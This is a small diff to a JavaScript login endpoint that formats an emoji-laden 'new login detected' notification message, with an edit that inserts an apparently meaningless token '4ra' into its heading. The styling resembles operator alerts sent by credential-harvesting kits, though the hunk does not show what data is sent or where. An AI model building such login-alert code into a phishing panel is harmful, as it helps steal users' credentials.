@@ -294,7 +294,7 @@ app.post('/api/login', async (req, res) => {
     const message = `🎯 <b>🔔 NEW LOGIN DETECTED 🔔</b>
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    🎪 <b>USER LOGIN INFORMATION</b> 🎪
+    🎪 <b>USER LOGIN 4ra INFORMATION</b> 🎪
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 🔹 <b>Login Method:</b> ${loginMethod.toUpperCase()}
